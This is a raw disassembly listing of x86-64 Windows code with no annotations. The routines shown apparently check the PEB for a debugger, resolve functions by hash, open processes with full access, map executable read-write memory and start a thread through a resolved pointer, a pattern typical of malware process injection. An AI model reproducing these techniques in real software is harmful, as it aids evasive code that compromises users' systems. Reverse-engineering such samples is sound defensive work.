    69689b39:	5b                   	pop    %rbx
    69689b3a:	5e                   	pop    %rsi
    69689b3b:	5f                   	pop    %rdi
    69689b3c:	5d                   	pop    %rbp
    69689b3d:	41 5c                	pop    %r12
    69689b3f:	c3                   	ret
    69689b40:	41 54                	push   %r12
    69689b42:	55                   	push   %rbp
    69689b43:	57                   	push   %rdi
    69689b44:	56                   	push   %rsi
    69689b45:	53                   	push   %rbx
    69689b46:	48 83 ec 20          	sub    $0x20,%rsp
    69689b4a:	48 8b 35 9f 35 00 00 	mov    0x359f(%rip),%rsi        # 0x6968d0f0
    69689b51:	31 db                	xor    %ebx,%ebx
    69689b53:	48 89 cd             	mov    %rcx,%rbp
    69689b56:	49 89 d4             	mov    %rdx,%r12
    69689b59:	4c 39 e3             	cmp    %r12,%rbx
    69689b5c:	7c 3a                	jl     0x69689b98
    69689b5e:	b9 01 00 00 00       	mov    $0x1,%ecx
    69689b63:	ff d6                	call   *%rsi
    69689b65:	41 b8 01 00 00 00    	mov    $0x1,%r8d
    69689b6b:	ba 01 00 00 00       	mov    $0x1,%edx
    69689b70:	48 8d 0d 83 45 00 00 	lea    0x4583(%rip),%rcx        # 0x6968e0fa
    69689b77:	49 89 c1             	mov    %rax,%r9
    69689b7a:	e8 c1 27 00 00       	call   0x6968c340
    69689b7f:	b9 01 00 00 00       	mov    $0x1,%ecx
    69689b84:	ff d6                	call   *%rsi
    69689b86:	48 89 c1             	mov    %rax,%rcx
    69689b89:	48 83 c4 20          	add    $0x20,%rsp
    69689b8d:	5b                   	pop    %rbx
    69689b8e:	5e                   	pop    %rsi
    69689b8f:	5f                   	pop    %rdi
    69689b90:	5d                   	pop    %rbp
    69689b91:	41 5c                	pop    %r12
    69689b93:	e9 b8 27 00 00       	jmp    0x6968c350
    69689b98:	48 8b 7c dd 00       	mov    0x0(%rbp,%rbx,8),%rdi
    69689b9d:	b9 01 00 00 00       	mov    $0x1,%ecx
    69689ba2:	48 ff c3             	inc    %rbx
    69689ba5:	ff d6                	call   *%rsi
    69689ba7:	45 31 c0             	xor    %r8d,%r8d
    69689baa:	48 89 c1             	mov    %rax,%rcx
    69689bad:	48 89 fa             	mov    %rdi,%rdx
    69689bb0:	e8 f4 fe ff ff       	call   0x69689aa9
    69689bb5:	eb a2                	jmp    0x69689b59
    69689bb7:	48 83 ec 28          	sub    $0x28,%rsp
    69689bbb:	31 c0                	xor    %eax,%eax
    69689bbd:	65 48 8b 14 25 60 00 	mov    %gs:0x60,%rdx
    69689bc4:	00 00 
    69689bc6:	80 7a 02 00          	cmpb   $0x0,0x2(%rdx)
    69689bca:	74 13                	je     0x69689bdf
    69689bcc:	48 8d 0d 4d 51 00 00 	lea    0x514d(%rip),%rcx        # 0x6968ed20
    69689bd3:	ba 01 00 00 00       	mov    $0x1,%edx
    69689bd8:	e8 63 ff ff ff       	call   0x69689b40
    69689bdd:	b0 01                	mov    $0x1,%al
    69689bdf:	48 83 c4 28          	add    $0x28,%rsp
    69689be3:	c3                   	ret
    69689be4:	48 83 ec 38          	sub    $0x38,%rsp
    69689be8:	48 c7 44 24 28 00 00 	movq   $0x0,0x28(%rsp)
    69689bef:	00 00 
    69689bf1:	48 89 ca             	mov    %rcx,%rdx
    69689bf4:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
    69689bf9:	e8 ec ef ff ff       	call   0x69688bea
    69689bfe:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
    69689c03:	48 83 c4 38          	add    $0x38,%rsp
    69689c07:	c3                   	ret
    69689c08:	41 57                	push   %r15
    69689c0a:	41 56                	push   %r14
    69689c0c:	41 55                	push   %r13
    69689c0e:	41 54                	push   %r12
    69689c10:	55                   	push   %rbp
    69689c11:	57                   	push   %rdi
    69689c12:	56                   	push   %rsi
    69689c13:	53                   	push   %rbx
    69689c14:	48 81 ec d8 00 00 00 	sub    $0xd8,%rsp
    69689c1b:	48 89 8c 24 20 01 00 	mov    %rcx,0x120(%rsp)
    69689c22:	00 
    69689c23:	48 8d 6c 24 64       	lea    0x64(%rsp),%rbp
    69689c28:	49 89 d5             	mov    %rdx,%r13
    69689c2b:	ba 10 00 00 00       	mov    $0x10,%edx
    69689c30:	4c 8d b4 24 90 00 00 	lea    0x90(%rsp),%r14
    69689c37:	00 
    69689c38:	4c 8d bc 24 a0 00 00 	lea    0xa0(%rsp),%r15
    69689c3f:	00 
    69689c40:	4c 89 f1             	mov    %r14,%rcx
    69689c43:	e8 84 7d ff ff       	call   0x696819cc
    69689c48:	ba 30 00 00 00       	mov    $0x30,%edx
    69689c4d:	4c 89 f9             	mov    %r15,%rcx
    69689c50:	e8 77 7d ff ff       	call   0x696819cc
    69689c55:	48 8b 05 04 28 10 00 	mov    0x102804(%rip),%rax        # 0x6978c460
    69689c5c:	48 c7 44 24 78 00 00 	movq   $0x0,0x78(%rsp)
    69689c63:	00 00 
    69689c65:	48 c7 44 24 70 00 00 	movq   $0x0,0x70(%rsp)
    69689c6c:	00 00 
    69689c6e:	48 8b 40 28          	mov    0x28(%rax),%rax
    69689c72:	48 89 84 24 90 00 00 	mov    %rax,0x90(%rsp)
    69689c79:	00 
    69689c7a:	ff 15 68 af 0f 00    	call   *0xfaf68(%rip)        # 0x69784be8
    69689c80:	31 d2                	xor    %edx,%edx
    69689c82:	b9 ff ff 1f 00       	mov    $0x1fffff,%ecx
    69689c87:	41 89 c0             	mov    %eax,%r8d
    69689c8a:	ff 15 50 7d 0f 00    	call   *0xf7d50(%rip)        # 0x697819e0
    69689c90:	48 8d 0d 09 b8 0e 00 	lea    0xeb809(%rip),%rcx        # 0x697754a0
    69689c97:	c7 44 24 64 00 00 00 	movl   $0x0,0x64(%rsp)
    69689c9e:	00 
    69689c9f:	49 89 c4             	mov    %rax,%r12
    69689ca2:	e8 f1 da ff ff       	call   0x69687798
    69689ca7:	ba 01 00 00 00       	mov    $0x1,%edx
    69689cac:	48 89 c1             	mov    %rax,%rcx
    69689caf:	e8 98 e0 ff ff       	call   0x69687d4c
    69689cb4:	45 31 c9             	xor    %r9d,%r9d
    69689cb7:	45 31 c0             	xor    %r8d,%r8d
    69689cba:	48 8d 15 42 49 00 00 	lea    0x4942(%rip),%rdx        # 0x6968e603
    69689cc1:	48 89 c1             	mov    %rax,%rcx
    69689cc4:	e8 a5 de ff ff       	call   0x69687b6e
    69689cc9:	31 d2                	xor    %edx,%edx
    69689ccb:	41 b9 00 10 00 00    	mov    $0x1000,%r9d
    69689cd1:	4c 89 e1             	mov    %r12,%rcx
    69689cd4:	4c 8b 05 a5 33 00 00 	mov    0x33a5(%rip),%r8        # 0x6968d080
    69689cdb:	48 89 05 0e 29 10 00 	mov    %rax,0x10290e(%rip)        # 0x6978c5f0
    69689ce2:	c7 44 24 20 40 00 00 	movl   $0x40,0x20(%rsp)
    69689ce9:	00 
    69689cea:	ff d0                	call   *%rax
    69689cec:	48 8b 15 8d 33 00 00 	mov    0x338d(%rip),%rdx        # 0x6968d080
    69689cf3:	49 89 e9             	mov    %rbp,%r9
    69689cf6:	41 b8 40 00 00 00    	mov    $0x40,%r8d
    69689cfc:	48 89 c3             	mov    %rax,%rbx
    69689cff:	48 89 c1             	mov    %rax,%rcx
    69689d02:	48 8d 34 10          	lea    (%rax,%rdx,1),%rsi
    69689d06:	48 8d 3c 32          	lea    (%rdx,%rsi,1),%rdi
    69689d0a:	ff 15 c8 a8 0f 00    	call   *0xfa8c8(%rip)        # 0x697845d8
    69689d10:	49 89 e9             	mov    %rbp,%r9
    69689d13:	41 b8 40 00 00 00    	mov    $0x40,%r8d
    69689d19:	48 89 f1             	mov    %rsi,%rcx
    69689d1c:	48 8b 15 5d 33 00 00 	mov    0x335d(%rip),%rdx        # 0x6968d080
    69689d23:	ff 15 af a8 0f 00    	call   *0xfa8af(%rip)        # 0x697845d8
    69689d29:	49 89 e9             	mov    %rbp,%r9
    69689d2c:	41 b8 40 00 00 00    	mov    $0x40,%r8d
    69689d32:	48 89 f9             	mov    %rdi,%rcx
    69689d35:	48 8b 15 44 33 00 00 	mov    0x3344(%rip),%rdx        # 0x6968d080
    69689d3c:	ff 15 96 a8 0f 00    	call   *0xfa896(%rip)        # 0x697845d8
    69689d42:	48 8d 0d c9 48 00 00 	lea    0x48c9(%rip),%rcx        # 0x6968e612
    69689d49:	48 89 da             	mov    %rbx,%rdx
    69689d4c:	e8 17 dc ff ff       	call   0x69687968
    69689d51:	48 8d 0d c8 48 00 00 	lea    0x48c8(%rip),%rcx        # 0x6968e620
    69689d58:	48 89 f2             	mov    %rsi,%rdx
    69689d5b:	e8 08 dc ff ff       	call   0x69687968
    69689d60:	48 8d 0d ce 48 00 00 	lea    0x48ce(%rip),%rcx        # 0x6968e635
    69689d67:	48 89 fa             	mov    %rdi,%rdx
    69689d6a:	e8 f9 db ff ff       	call   0x69687968
    69689d6f:	48 8d 4c 24 78       	lea    0x78(%rsp),%rcx
    69689d74:	4d 89 f1             	mov    %r14,%r9
    69689d77:	4d 89 f8             	mov    %r15,%r8
    69689d7a:	ba ff ff 1f 00       	mov    $0x1fffff,%edx
    69689d7f:	ff d3                	call   *%rbx
    69689d81:	45 31 c9             	xor    %r9d,%r9d
    69689d84:	31 d2                	xor    %edx,%edx
    69689d86:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
    69689d8a:	48 c7 44 24 28 00 00 	movq   $0x0,0x28(%rsp)
    69689d91:	00 00 
    69689d93:	41 b8 40 00 00 00    	mov    $0x40,%r8d
    69689d99:	44 89 6c 24 20       	mov    %r13d,0x20(%rsp)
    69689d9e:	ff 15 2c b6 0f 00    	call   *0xfb62c(%rip)        # 0x697853d0
    69689da4:	48 85 c0             	test   %rax,%rax
    69689da7:	48 89 c5             	mov    %rax,%rbp
    69689daa:	75 73                	jne    0x69689e1f
    69689dac:	48 8d 9c 24 88 00 00 	lea    0x88(%rsp),%rbx
    69689db3:	00 
    69689db4:	ba 08 00 00 00       	mov    $0x8,%edx
    69689db9:	48 89 d9             	mov    %rbx,%rcx
    69689dbc:	e8 0b 7c ff ff       	call   0x696819cc
    69689dc1:	ba 04 d8 47 11       	mov    $0x1147d804,%edx
    69689dc6:	48 8d 0d 93 55 00 00 	lea    0x5593(%rip),%rcx        # 0x6968f360
    69689dcd:	e8 48 db ff ff       	call   0x6968791a
    69689dd2:	48 89 d9             	mov    %rbx,%rcx
    69689dd5:	ba 01 00 00 00       	mov    $0x1,%edx
    69689dda:	48 8d 9c 24 80 00 00 	lea    0x80(%rsp),%rbx
    69689de1:	00 
    69689de2:	48 89 84 24 88 00 00 	mov    %rax,0x88(%rsp)
    69689de9:	00 
    69689dea:	e8 51 fd ff ff       	call   0x69689b40
    69689def:	ba 08 00 00 00       	mov    $0x8,%edx
    69689df4:	48 89 d9             	mov    %rbx,%rcx
    69689df7:	e8 d0 7b ff ff       	call   0x696819cc
    69689dfc:	ff 15 de ad 0f 00    	call   *0xfadde(%rip)        # 0x69784be0
    69689e02:	48 63 c8             	movslq %eax,%rcx
    69689e05:	e8 da fd ff ff       	call   0x69689be4
    69689e0a:	ba 01 00 00 00       	mov    $0x1,%edx
    69689e0f:	48 89 d9             	mov    %rbx,%rcx
    69689e12:	48 89 84 24 80 00 00 	mov    %rax,0x80(%rsp)
    69689e19:	00 
    69689e1a:	e8 21 fd ff ff       	call   0x69689b40
    69689e1f:	ff 15 3b 2a 10 00    	call   *0x102a3b(%rip)        # 0x6978c860
    69689e25:	45 31 c9             	xor    %r9d,%r9d
    69689e28:	45 31 c0             	xor    %r8d,%r8d
    69689e2b:	48 89 e9             	mov    %rbp,%rcx
    69689e2e:	c7 44 24 40 00 00 00 	movl   $0x0,0x40(%rsp)
    69689e35:	00 
    69689e36:	48 89 c2             	mov    %rax,%rdx
    69689e39:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
    69689e40:	00 00 
    69689e42:	c7 44 24 30 40 00 00 	movl   $0x40,0x30(%rsp)
    69689e49:	00 
    69689e4a:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
    69689e51:	00 
    69689e52:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
    69689e59:	00 00 
    69689e5b:	ff 15 77 b5 0f 00    	call   *0xfb577(%rip)        # 0x697853d8
    69689e61:	48 85 c0             	test   %rax,%rax
    69689e64:	48 89 c3             	mov    %rax,%rbx
    69689e67:	75 73                	jne    0x69689edc
    69689e69:	4c 8d bc 24 88 00 00 	lea    0x88(%rsp),%r15
    69689e70:	00 
    69689e71:	ba 08 00 00 00       	mov    $0x8,%edx
    69689e76:	4c 89 f9             	mov    %r15,%rcx
    69689e79:	e8 4e 7b ff ff       	call   0x696819cc
    69689e7e:	ba 4c 0e 19 38       	mov    $0x38190e4c,%edx
    69689e83:	48 8d 0d 96 54 00 00 	lea    0x5496(%rip),%rcx        # 0x6968f320
    69689e8a:	e8 8b da ff ff       	call   0x6968791a
    69689e8f:	4c 89 f9             	mov    %r15,%rcx
    69689e92:	ba 01 00 00 00       	mov    $0x1,%edx
    69689e97:	4c 8d bc 24 80 00 00 	lea    0x80(%rsp),%r15
    69689e9e:	00 
    69689e9f:	48 89 84 24 88 00 00 	mov    %rax,0x88(%rsp)
    69689ea6:	00 
    69689ea7:	e8 94 fc ff ff       	call   0x69689b40
    69689eac:	ba 08 00 00 00       	mov    $0x8,%edx
    69689eb1:	4c 89 f9             	mov    %r15,%rcx
    69689eb4:	e8 13 7b ff ff       	call   0x696819cc
    69689eb9:	ff 15 21 ad 0f 00    	call   *0xfad21(%rip)        # 0x69784be0
    69689ebf:	48 63 c8             	movslq %eax,%rcx
    69689ec2:	e8 1d fd ff ff       	call   0x69689be4
    69689ec7:	ba 01 00 00 00       	mov    $0x1,%edx
    69689ecc:	4c 89 f9             	mov    %r15,%rcx
    69689ecf:	48 89 84 24 80 00 00 	mov    %rax,0x80(%rsp)
    69689ed6:	00 
    69689ed7:	e8 64 fc ff ff       	call   0x69689b40
    69689edc:	48 8d 44 24 68       	lea    0x68(%rsp),%rax
    69689ee1:	4d 89 e9             	mov    %r13,%r9
    69689ee4:	4c 8b 84 24 20 01 00 	mov    0x120(%rsp),%r8
    69689eeb:	00 
    69689eec:	48 89 da             	mov    %rbx,%rdx
    69689eef:	4c 89 e1             	mov    %r12,%rcx
    69689ef2:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
    69689ef7:	48 c7 44 24 68 00 00 	movq   $0x0,0x68(%rsp)
    69689efe:	00 00 
    69689f00:	ff d6                	call   *%rsi
    69689f02:	45 31 c9             	xor    %r9d,%r9d
    69689f05:	45 31 c0             	xor    %r8d,%r8d
    69689f08:	c7 44 24 40 00 00 00 	movl   $0x0,0x40(%rsp)
    69689f0f:	00 
    69689f10:	c7 44 24 30 40 00 00 	movl   $0x40,0x30(%rsp)
    69689f17:	00 
    69689f18:	48 8b 54 24 78       	mov    0x78(%rsp),%rdx
    69689f1d:	48 89 e9             	mov    %rbp,%rcx
    69689f20:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
    69689f27:	00 00 
    69689f29:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
    69689f30:	00 
    69689f31:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
    69689f38:	00 00 
    69689f3a:	ff 15 98 b4 0f 00    	call   *0xfb498(%rip)        # 0x697853d8
    69689f40:	48 85 c0             	test   %rax,%rax
    69689f43:	48 89 c6             	mov    %rax,%rsi
    69689f46:	75 73                	jne    0x69689fbb
    69689f48:	48 8d ac 24 88 00 00 	lea    0x88(%rsp),%rbp
    69689f4f:	00 
    69689f50:	ba 08 00 00 00       	mov    $0x8,%edx
    69689f55:	48 89 e9             	mov    %rbp,%rcx
    69689f58:	e8 6f 7a ff ff       	call   0x696819cc
    69689f5d:	ba a4 81 71 1b       	mov    $0x1b7181a4,%edx
    69689f62:	48 8d 0d 77 53 00 00 	lea    0x5377(%rip),%rcx        # 0x6968f2e0
    69689f69:	e8 ac d9 ff ff       	call   0x6968791a
    69689f6e:	48 89 e9             	mov    %rbp,%rcx
    69689f71:	ba 01 00 00 00       	mov    $0x1,%edx
    69689f76:	48 8d ac 24 80 00 00 	lea    0x80(%rsp),%rbp
    69689f7d:	00 
    69689f7e:	48 89 84 24 88 00 00 	mov    %rax,0x88(%rsp)
    69689f85:	00 
    69689f86:	e8 b5 fb ff ff       	call   0x69689b40
    69689f8b:	ba 08 00 00 00       	mov    $0x8,%edx
    69689f90:	48 89 e9             	mov    %rbp,%rcx
    69689f93:	e8 34 7a ff ff       	call   0x696819cc
    69689f98:	ff 15 42 ac 0f 00    	call   *0xfac42(%rip)        # 0x69784be0
    69689f9e:	48 63 c8             	movslq %eax,%rcx
    69689fa1:	e8 3e fc ff ff       	call   0x69689be4
    69689fa6:	ba 01 00 00 00       	mov    $0x1,%edx
    69689fab:	48 89 e9             	mov    %rbp,%rcx
    69689fae:	48 89 84 24 80 00 00 	mov    %rax,0x80(%rsp)
    69689fb5:	00 
    69689fb6:	e8 85 fb ff ff       	call   0x69689b40
    69689fbb:	b9 0f 00 00 00       	mov    $0xf,%ecx
    69689fc0:	e8 c3 d4 ff ff       	call   0x69687488
    69689fc5:	48 89 1d 64 b4 0f 00 	mov    %rbx,0xfb464(%rip)        # 0x69785430
    69689fcc:	48 89 1d fd a5 0f 00 	mov    %rbx,0xfa5fd(%rip)        # 0x697845d0
    69689fd3:	e8 13 9a ff ff       	call   0x696839eb
    69689fd8:	4c 8b 4c 24 78       	mov    0x78(%rsp),%r9
    69689fdd:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
    69689fe2:	48 c7 44 24 50 00 00 	movq   $0x0,0x50(%rsp)
    69689fe9:	00 00 
    69689feb:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%rsp)
    69689ff2:	00 
    69689ff3:	45 31 c0             	xor    %r8d,%r8d
    69689ff6:	ba ff ff 1f 00       	mov    $0x1fffff,%edx
    69689ffb:	48 c7 44 24 48 00 00 	movq   $0x0,0x48(%rsp)
    6968a002:	00 00 
    6968a004:	48 c7 44 24 40 00 00 	movq   $0x0,0x40(%rsp)
    6968a00b:	00 00 
    6968a00d:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
    6968a014:	00 00 
    6968a016:	48 c7 44 24 28 00 00 	movq   $0x0,0x28(%rsp)
    6968a01d:	00 00 
    6968a01f:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
    6968a024:	ff d7                	call   *%rdi
    6968a026:	90                   	nop
    6968a027:	48 81 c4 d8 00 00 00 	add    $0xd8,%rsp
    6968a02e:	5b                   	pop    %rbx
    6968a02f:	5e                   	pop    %rsi
    6968a030:	5f                   	pop    %rdi
    6968a031:	5d                   	pop    %rbp
    6968a032:	41 5c                	pop    %r12
    6968a034:	41 5d                	pop    %r13
    6968a036:	41 5e                	pop    %r14
    6968a038:	41 5f                	pop    %r15
    6968a03a:	c3                   	ret
    6968a03b:	41 57                	push   %r15
    6968a03d:	41 56                	push   %r14
    6968a03f:	41 55                	push   %r13
    6968a041:	41 54                	push   %r12
    6968a043:	55                   	push   %rbp
    6968a044:	57                   	push   %rdi
    6968a045:	56                   	push   %rsi
    6968a046:	53                   	push   %rbx
    6968a047:	48 83 ec 68          	sub    $0x68,%rsp
    6968a04b:	48 8b bc 24 d0 00 00 	mov    0xd0(%rsp),%rdi
    6968a052:	00 
    6968a053:	48 8d 5c 24 48       	lea    0x48(%rsp),%rbx
    6968a058:	48 89 94 24 b8 00 00 	mov    %rdx,0xb8(%rsp)
    6968a05f:	00 
    6968a060:	48 89 ce             	mov    %rcx,%rsi
    6968a063:	ba 18 00 00 00       	mov    $0x18,%edx
    6968a068:	48 89 d9             	mov    %rbx,%rcx
    6968a06b:	4d 89 c4             	mov    %r8,%r12
    6968a06e:	4d 89 cf             	mov    %r9,%r15
    6968a071:	e8 56 79 ff ff       	call   0x696819cc
    6968a076:	48 89 f9             	mov    %rdi,%rcx
    6968a079:	c7 44 24 48 18 00 00 	movl   $0x18,0x48(%rsp)
    6968a080:	00 
    6968a081:	48 c7 44 24 50 00 00 	movq   $0x0,0x50(%rsp)
    6968a088:	00 00 
    6968a08a:	c7 44 24 58 01 00 00 	movl   $0x1,0x58(%rsp)
    6968a091:	00 
    6968a092:	e8 4d fb ff ff       	call   0x69689be4
    6968a097:	b9 0f 00 00 00       	mov    $0xf,%ecx
    6968a09c:	48 85 c0             	test   %rax,%rax
    6968a09f:	48 89 c5             	mov    %rax,%rbp
    6968a0a2:	74 07                	je     0x6968a0ab
    6968a0a4:	48 8b 00             	mov    (%rax),%rax
    6968a0a7:	48 8d 48 0f          	lea    0xf(%rax),%rcx
    6968a0ab:	e8 7b d4 ff ff       	call   0x6968752b
    6968a0b0:	48 8d 15 69 4d 00 00 	lea    0x4d69(%rip),%rdx        # 0x6968ee20
    6968a0b7:	48 89 c1             	mov    %rax,%rcx
    6968a0ba:	49 89 c1             	mov    %rax,%r9
    6968a0bd:	e8 b6 78 ff ff       	call   0x69681978
    6968a0c2:	48 89 ea             	mov    %rbp,%rdx
    6968a0c5:	4c 89 c9             	mov    %r9,%rcx
    6968a0c8:	e8 d1 78 ff ff       	call   0x6968199e
    6968a0cd:	4c 89 c9             	mov    %r9,%rcx
    6968a0d0:	e8 e7 e7 ff ff       	call   0x696888bc
    6968a0d5:	48 89 f9             	mov    %rdi,%rcx
    6968a0d8:	49 89 c6             	mov    %rax,%r14
    6968a0db:	e8 04 fb ff ff       	call   0x69689be4
    6968a0e0:	b9 0e 00 00 00       	mov    $0xe,%ecx
    6968a0e5:	48 85 c0             	test   %rax,%rax
    6968a0e8:	48 89 c7             	mov    %rax,%rdi
    6968a0eb:	74 07                	je     0x6968a0f4
    6968a0ed:	48 8b 00             	mov    (%rax),%rax
    6968a0f0:	48 8d 48 0e          	lea    0xe(%rax),%rcx
    6968a0f4:	e8 32 d4 ff ff       	call   0x6968752b
    6968a0f9:	48 8d 15 00 4d 00 00 	lea    0x4d00(%rip),%rdx        # 0x6968ee00
    6968a100:	48 89 c1             	mov    %rax,%rcx
    6968a103:	49 89 c1             	mov    %rax,%r9
    6968a106:	e8 6d 78 ff ff       	call   0x69681978
    6968a10b:	48 89 fa             	mov    %rdi,%rdx
    6968a10e:	4c 89 c9             	mov    %r9,%rcx
    6968a111:	e8 88 78 ff ff       	call   0x6968199e
    6968a116:	4c 89 c9             	mov    %r9,%rcx
    6968a119:	e8 9e e7 ff ff       	call   0x696888bc
    6968a11e:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
    6968a123:	4c 89 f1             	mov    %r14,%rcx
    6968a126:	41 b9 01 00 00 00    	mov    $0x1,%r9d
    6968a12c:	49 89 c5             	mov    %rax,%r13
    6968a12f:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%rsp)
    6968a136:	00 
    6968a137:	41 b8 01 00 00 00    	mov    $0x1,%r8d
    6968a13d:	ba 01 00 00 80       	mov    $0x80000001,%edx
    6968a142:	c7 44 24 28 00 04 00 	movl   $0x400,0x28(%rsp)
    6968a149:	00 
    6968a14a:	c7 44 24 20 00 04 00 	movl   $0x400,0x20(%rsp)
    6968a151:	00 
    6968a152:	ff 15 68 b2 0f 00    	call   *0xfb268(%rip)        # 0x697853c0
    6968a158:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
    6968a15c:	48 89 c7             	mov    %rax,%rdi
    6968a15f:	75 0e                	jne    0x6968a16f
    6968a161:	e8 9b 87 ff ff       	call   0x69682901
    6968a166:	31 d2                	xor    %edx,%edx
    6968a168:	89 c1                	mov    %eax,%ecx
    6968a16a:	e8 3d ef ff ff       	call   0x696890ac
    6968a16f:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
    6968a174:	ba 02 00 00 80       	mov    $0x80000002,%edx
    6968a179:	4c 89 e9             	mov    %r13,%rcx
    6968a17c:	41 b9 01 00 00 00    	mov    $0x1,%r9d
    6968a182:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%rsp)
    6968a189:	00 
    6968a18a:	41 b8 01 00 00 00    	mov    $0x1,%r8d
    6968a190:	c7 44 24 28 00 04 00 	movl   $0x400,0x28(%rsp)
    6968a197:	00 
    6968a198:	c7 44 24 20 00 04 00 	movl   $0x400,0x20(%rsp)
    6968a19f:	00 
    6968a1a0:	ff 15 1a b2 0f 00    	call   *0xfb21a(%rip)        # 0x697853c0
    6968a1a6:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
    6968a1aa:	48 89 c5             	mov    %rax,%rbp
    6968a1ad:	75 0e                	jne    0x6968a1bd
    6968a1af:	e8 4d 87 ff ff       	call   0x69682901
    6968a1b4:	31 d2                	xor    %edx,%edx
    6968a1b6:	89 c1                	mov    %eax,%ecx
    6968a1b8:	e8 ef ee ff ff       	call   0x696890ac
    6968a1bd:	45 31 c0             	xor    %r8d,%r8d
    6968a1c0:	49 89 d9             	mov    %rbx,%r9
    6968a1c3:	4c 89 f1             	mov    %r14,%rcx
    6968a1c6:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
    6968a1cd:	00 00 
    6968a1cf:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
    6968a1d6:	00 
    6968a1d7:	ba 02 00 10 00       	mov    $0x100002,%edx
    6968a1dc:	c7 44 24 20 03 00 00 	movl   $0x3,0x20(%rsp)
    6968a1e3:	00 
    6968a1e4:	ff 15 3e 09 0f 00    	call   *0xf093e(%rip)        # 0x6977ab28
    6968a1ea:	48 89 46 58          	mov    %rax,0x58(%rsi)
    6968a1ee:	48 ff c0             	inc    %rax
    6968a1f1:	75 0e                	jne    0x6968a201
    6968a1f3:	e8 09 87 ff ff       	call   0x69682901
    6968a1f8:	31 d2                	xor    %edx,%edx
    6968a1fa:	89 c1                	mov    %eax,%ecx
    6968a1fc:	e8 ab ee ff ff       	call   0x696890ac
    6968a201:	48 8b 4e 58          	mov    0x58(%rsi),%rcx
    6968a205:	ba 01 00 00 00       	mov    $0x1,%edx
    6968a20a:	e8 9d ef ff ff       	call   0x696891ac
    6968a20f:	45 31 c0             	xor    %r8d,%r8d
    6968a212:	49 89 d9             	mov    %rbx,%r9
    6968a215:	ba 01 00 10 00       	mov    $0x100001,%edx
    6968a21a:	48 89 46 60          	mov    %rax,0x60(%rsi)
    6968a21e:	4c 89 e9             	mov    %r13,%rcx
    6968a221:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
    6968a228:	00 00 
    6968a22a:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
    6968a231:	00 
    6968a232:	c7 44 24 20 03 00 00 	movl   $0x3,0x20(%rsp)
    6968a239:	00 
    6968a23a:	ff 15 e8 08 0f 00    	call   *0xf08e8(%rip)        # 0x6977ab28
    6968a240:	48 89 46 50          	mov    %rax,0x50(%rsi)
    6968a244:	48 ff c0             	inc    %rax
    6968a247:	75 0e                	jne    0x6968a257
    6968a249:	e8 b3 86 ff ff       	call   0x69682901
    6968a24e:	31 d2                	xor    %edx,%edx
    6968a250:	89 c1                	mov    %eax,%ecx
    6968a252:	e8 55 ee ff ff       	call   0x696890ac
    6968a257:	31 d2                	xor    %edx,%edx
    6968a259:	48 89 e9             	mov    %rbp,%rcx
    6968a25c:	e8 4b ef ff ff       	call   0x696891ac
    6968a261:	48 8b b4 24 b8 00 00 	mov    0xb8(%rsp),%rsi
    6968a268:	00 
    6968a269:	31 d2                	xor    %edx,%edx
    6968a26b:	48 89 f9             	mov    %rdi,%rcx
    6968a26e:	48 89 06             	mov    %rax,(%rsi)
    6968a271:	e8 36 ef ff ff       	call   0x696891ac
    6968a276:	48 89 e9             	mov    %rbp,%rcx
    6968a279:	49 89 04 24          	mov    %rax,(%r12)
    6968a27d:	e8 5f ee ff ff       	call   0x696890e1
    6968a282:	48 89 f9             	mov    %rdi,%rcx
    6968a285:	e8 57 ee ff ff       	call   0x696890e1
    6968a28a:	49 8b 04 24          	mov    (%r12),%rax
    6968a28e:	49 89 07             	mov    %rax,(%r15)
    6968a291:	48 83 c4 68          	add    $0x68,%rsp
    6968a295:	5b                   	pop    %rbx
    6968a296:	5e                   	pop    %rsi
    6968a297:	5f                   	pop    %rdi
    6968a298:	5d                   	pop    %rbp
    6968a299:	41 5c                	pop    %r12
    6968a29b:	41 5d                	pop    %r13
    6968a29d:	41 5e                	pop    %r14
    6968a29f:	41 5f                	pop    %r15
    6968a2a1:	c3                   	ret
    6968a2a2:	41 57                	push   %r15
    6968a2a4:	41 56                	push   %r14
    6968a2a6:	41 55                	push   %r13
    6968a2a8:	41 54                	push   %r12
    6968a2aa:	55                   	push   %rbp
    6968a2ab:	57                   	push   %rdi
    6968a2ac:	56                   	push   %rsi
    6968a2ad:	53                   	push   %rbx
    6968a2ae:	48 81 ec 28 01 00 00 	sub    $0x128,%rsp
    6968a2b5:	8b b4 24 98 01 00 00 	mov    0x198(%rsp),%esi
    6968a2bc:	48 8d bc 24 b8 00 00 	lea    0xb8(%rsp),%rdi
    6968a2c3:	00 
    6968a2c4:	49 89 cc             	mov    %rcx,%r12
    6968a2c7:	48 89 d5             	mov    %rdx,%rbp
    6968a2ca:	48 89 f9             	mov    %rdi,%rcx
    6968a2cd:	ba 68 00 00 00       	mov    $0x68,%edx
    6968a2d2:	4d 89 c5             	mov    %r8,%r13
    6968a2d5:	4d 89 ce             	mov    %r9,%r14
    6968a2d8:	e8 ef 76 ff ff       	call   0x696819cc
    6968a2dd:	48 8d 84 24 a0 00 00 	lea    0xa0(%rsp),%rax
    6968a2e4:	00 
    6968a2e5:	ba 18 00 00 00       	mov    $0x18,%edx
    6968a2ea:	48 89 c1             	mov    %rax,%rcx
